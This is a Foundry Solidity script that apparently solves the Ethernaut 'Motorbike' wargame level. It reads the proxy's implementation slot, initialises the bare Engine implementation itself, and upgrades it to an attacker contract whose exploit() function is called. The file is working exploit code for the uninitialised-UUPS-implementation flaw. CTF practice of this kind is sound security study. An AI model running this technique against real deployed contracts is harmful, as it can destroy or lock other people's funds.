// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Script.sol";
import "instances/25_Motorbike.sol";
import "contracts/25_Motorbike.sol";

contract AttackerMotorbikeScript is Script {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    Motorbike motorbike = Motorbike(payable(vm.envAddress("INSTANCE")));
    Engine iEngine = Engine(address(motorbike));

    function run() external {
        vm.startBroadcast();

        address addressEngine = address(uint256(vm.load(address(motorbike), bytes32(uint256(_IMPLEMENTATION_SLOT)))));

        Engine engine = Engine(addressEngine);
        AttackerEngine attackerEngine = new AttackerEngine();

        engine.initialize();
        engine.upgradeToAndCall(address(attackerEngine), abi.encodeWithSignature("exploit()"));

        vm.stopBroadcast();
    }
}
